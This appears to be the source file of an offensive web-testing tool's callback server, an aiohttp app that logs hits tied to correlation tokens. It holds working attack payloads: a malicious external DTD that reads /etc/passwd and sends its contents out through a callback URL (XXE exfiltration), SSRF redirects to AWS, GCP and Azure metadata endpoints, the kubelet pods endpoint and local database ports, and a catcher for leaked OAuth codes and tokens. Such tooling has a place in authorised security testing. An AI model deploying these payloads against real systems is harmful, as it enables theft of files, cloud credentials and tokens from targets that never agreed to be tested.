"""
payload_server.py — Local HTTP server exposed via the tunnel.

Serves payloads that targets fetch back during SSRF / XXE / upload-callback /
open-redirect testing. Every incoming request is logged to a Hit list so the
reporter can attribute callbacks to specific findings via correlation IDs.

Handlers:

  GET  /                       banner — confirms the server is reachable
  GET  /healthz                liveness probe — returns "ok"
  GET  /r/<token>              correlation logger — records the token and
                               returns a tiny JSON ack. The probe embeds the
                               token in the SSRF/XXE/upload payload.
  GET  /ssrf/redirect?to=URL   302 to an arbitrary URL (SSRF redirect chains)
  GET  /ssrf/internal/<svc>    302 to common internal targets:
                                 /aws  → http://169.254.169.254/latest/meta-data/
                                 /gcp  → http://metadata.google.internal/...
                                 /loopback → http://127.0.0.1/
  GET  /xxe/<id>.dtd           serves a malicious external DTD that triggers
                               an out-of-band callback with file contents
  POST /upload/echo            echoes posted body, headers, and metadata into
                               the Hit log — verifies file-upload exfil
  *    /oauth/redirect         catches OAuth redirect_uri leaks — records
                               whatever code/token/state lands here
  *    *                       catchall — logs everything, returns the banner

The host/port come from the config's [payload_server] block. By default we
bind 127.0.0.1:0 (random free port) so the tunnel is the only public-facing
piece.
"""

from __future__ import annotations

import asyncio
import json
import socket
import time
import uuid
from dataclasses import dataclass, field
from typing import Optional


# ---------------------------------------------------------------------------
# Hit record
# ---------------------------------------------------------------------------


@dataclass
class Hit:
    """One incoming request, captured for the report."""
    received_at: float
    method: str
    path: str
    query: dict
    headers: dict
    body: str  # truncated to 4 KB
    peer: str
    correlation_id: Optional[str] = None
    kind: str = "generic"  # ssrf-redirect | ssrf-internal | xxe | upload | oauth | correlation | generic

    def to_dict(self) -> dict:
        return {
            "received_at": self.received_at,
            "method": self.method,
            "path": self.path,
            "query": self.query,
            "headers": {k: v for k, v in self.headers.items() if k.lower() not in ("authorization",)},
            "body": self.body,
            "peer": self.peer,
            "correlation_id": self.correlation_id,
            "kind": self.kind,
        }


# ---------------------------------------------------------------------------
# Server
# ---------------------------------------------------------------------------


class PayloadServer:
    """Lifecycle wrapper around an aiohttp application. Use as an async
    context manager:

        async with PayloadServer(host="127.0.0.1", port=0) as srv:
            print(srv.local_url)        # http://127.0.0.1:54321
            # ... feed srv.local_url to a Tunnel, run probes ...
            for hit in srv.hits:
                ...
    """

    BODY_TRUNC = 4096

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 0,
        payload_dir: Optional[str] = None,
    ):
        self.host = host
        self.requested_port = port
        self.payload_dir = payload_dir
        self.hits: list[Hit] = []
        self._runner = None  # aiohttp.web.AppRunner
        self._site = None    # aiohttp.web.TCPSite
        self._actual_port: int = 0
        self._tokens: set[str] = set()  # active correlation IDs we issued
        # Optional callback fired once per recorded hit (passed the Hit object).
        # Used by the TUI to stream OOB callbacks into the Recon→Tunnel view.
        self.on_hit = None

    @property
    def local_url(self) -> str:
        port = self._actual_port or self.requested_port
        return f"http://{self.host}:{port}"

    def mint_token(self, kind: str = "probe") -> str:
        """Issue a correlation ID for a probe. The probe embeds this in its
        payload so we can attribute incoming hits back."""
        token = f"{kind}-{uuid.uuid4().hex[:12]}"
        self._tokens.add(token)
        return token

    def hits_for(self, token: str) -> list[Hit]:
        """All hits whose correlation_id matches the given token."""
        return [h for h in self.hits if h.correlation_id == token]

    async def __aenter__(self) -> "PayloadServer":
        await self.start()
        return self

    async def __aexit__(self, *exc) -> None:
        await self.stop()

    async def start(self) -> None:
        try:
            from aiohttp import web
        except ImportError as exc:
            raise RuntimeError(
                "aiohttp is required for payload_server — "
                "install with `pip install aiohttp>=3.9`"
            ) from exc

        app = web.Application(client_max_size=16 * 1024 * 1024)
        app.router.add_get("/", self._handle_root)
        app.router.add_get("/healthz", self._handle_healthz)
        app.router.add_get("/r/{token}", self._handle_correlation)
        app.router.add_get("/ssrf/redirect", self._handle_ssrf_redirect)
        app.router.add_get("/ssrf/internal/{svc}", self._handle_ssrf_internal)
        app.router.add_get("/xxe/{name}", self._handle_xxe_dtd)
        app.router.add_post("/upload/echo", self._handle_upload_echo)
        app.router.add_route("*", "/oauth/redirect", self._handle_oauth_redirect)
        # Catchall — must be last
        app.router.add_route("*", "/{tail:.*}", self._handle_catchall)

        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        # Resolve port=0 by binding a socket first and reading back the port
        if self.requested_port == 0:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind((self.host, 0))
            self._actual_port = sock.getsockname()[1]
            sock.close()
        else:
            self._actual_port = self.requested_port

        site = web.TCPSite(runner, self.host, self._actual_port, reuse_address=True)
        await site.start()
        self._runner = runner
        self._site = site

    async def stop(self) -> None:
        if self._runner is not None:
            await self._runner.cleanup()
            self._runner = None
            self._site = None

    # ── shared hit-recording ──────────────────────────────────────────────

    async def _record(self, request, kind: str, correlation_id: Optional[str] = None) -> None:
        try:
            body_bytes = await request.read()
        except (asyncio.CancelledError, RuntimeError):
            body_bytes = b""
        body = body_bytes[: self.BODY_TRUNC].decode(errors="replace")
        # Peer — prefer XFF since we're behind a tunnel
        xff = request.headers.get("X-Forwarded-For") or request.headers.get("CF-Connecting-IP")
        peer = xff or (request.remote or "")
        # Token extraction priority:
        #   1. caller-supplied correlation_id (route handler knows the truth)
        #   2. ?token= or ?t= query
        #   3. any path segment that matches an issued token (XXE filename, etc.)
        #   4. body — last resort, scan for a known token substring
        token = correlation_id
        if token is None:
            qtoken = request.query.get("token") or request.query.get("t")
            if qtoken and qtoken in self._tokens:
                token = qtoken
        if token is None:
            for seg in request.path.split("/"):
                stem = seg.split(".", 1)[0]
                if stem in self._tokens:
                    token = stem
                    break
        if token is None and body:
            for known in self._tokens:
                if known in body:
                    token = known
                    break
        hit = Hit(
            received_at=time.time(),
            method=request.method,
            path=request.path,
            query=dict(request.query),
            headers=dict(request.headers),
            body=body,
            peer=peer,
            correlation_id=token,
            kind=kind,
        )
        self.hits.append(hit)
        if self.on_hit is not None:
            try:
                self.on_hit(hit)
            except Exception:
                pass

    # ── handlers ──────────────────────────────────────────────────────────

    async def _handle_root(self, request):
        from aiohttp import web
        await self._record(request, kind="generic")
        return web.Response(
            text="hxxpsin payload server — ok\n",
            content_type="text/plain",
        )

    async def _handle_healthz(self, request):
        from aiohttp import web
        return web.Response(text="ok", content_type="text/plain")

    async def _handle_correlation(self, request):
        from aiohttp import web
        token = request.match_info["token"]
        await self._record(request, kind="correlation", correlation_id=token)
        return web.json_response({"ok": True, "token": token})

    async def _handle_ssrf_redirect(self, request):
        from aiohttp import web
        target = request.query.get("to", "")
        await self._record(request, kind="ssrf-redirect")
        if not target:
            return web.Response(status=400, text="missing ?to=")
        # 302 to whatever the operator-controlled probe asked for. Used to
        # chain SSRF — fetcher requests our tunnel URL, we redirect onward
        # to an internal IP / metadata endpoint / etc.
        return web.Response(status=302, headers={"Location": target})

    async def _handle_ssrf_internal(self, request):
        from aiohttp import web
        await self._record(request, kind="ssrf-internal")
        svc = request.match_info["svc"]
        targets = {
            "aws": "http://169.254.169.254/latest/meta-data/",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/",
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "loopback": "http://127.0.0.1/",
            "loopback-22": "http://127.0.0.1:22/",
            "loopback-6379": "http://127.0.0.1:6379/",  # redis
            "loopback-3306": "http://127.0.0.1:3306/",  # mysql
            "loopback-5432": "http://127.0.0.1:5432/",  # postgres
            "loopback-9200": "http://127.0.0.1:9200/",  # elasticsearch
            "kubelet": "http://127.0.0.1:10250/pods",
        }
        target = targets.get(svc)
        if not target:
            return web.Response(status=404, text=f"unknown internal target: {svc}")
        return web.Response(status=302, headers={"Location": target})

    async def _handle_xxe_dtd(self, request):
        from aiohttp import web
        await self._record(request, kind="xxe")
        name = request.match_info["name"]
        # The DTD references our /r/<token> endpoint with the file contents
        # interpolated into the URL — classic XXE OOB exfil.
        token = name.rsplit(".", 1)[0]
        callback = f"{self.local_url}/r/{token}?leak=%file;"
        dtd = (
            f'<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{callback}\'>">\n'
            f'%eval;\n%exfil;\n'
        )
        return web.Response(text=dtd, content_type="application/xml-dtd")

    async def _handle_upload_echo(self, request):
        from aiohttp import web
        await self._record(request, kind="upload")
        # Confirms target's file processor actually fetched & parsed our upload
        return web.json_response({
            "received": True,
            "method": request.method,
            "size": int(request.headers.get("Content-Length", 0)),
            "content_type": request.headers.get("Content-Type", ""),
        })

    async def _handle_oauth_redirect(self, request):
        from aiohttp import web
        await self._record(request, kind="oauth")
        # OAuth flows redirect here with code/access_token/state in query or
        # fragment. We just acknowledge — the hit record captures everything.
        return web.Response(
            text="<html><body><h1>OAuth callback received</h1></body></html>",
            content_type="text/html",
        )

    async def _handle_catchall(self, request):
        from aiohttp import web
        await self._record(request, kind="generic")
        return web.Response(text="hxxpsin payload server — ok\n", content_type="text/plain")


# ---------------------------------------------------------------------------
# Factory
# ---------------------------------------------------------------------------


def from_profile(profile) -> PayloadServer:
    """Build a PayloadServer from an auth_config.PayloadServerProfile."""
    import os
    payload_dir = profile.payload_dir
    if payload_dir:
        payload_dir = os.path.expanduser(payload_dir)
    return PayloadServer(
        host=profile.host or "127.0.0.1",
        port=profile.port or 0,
        payload_dir=payload_dir,
    )
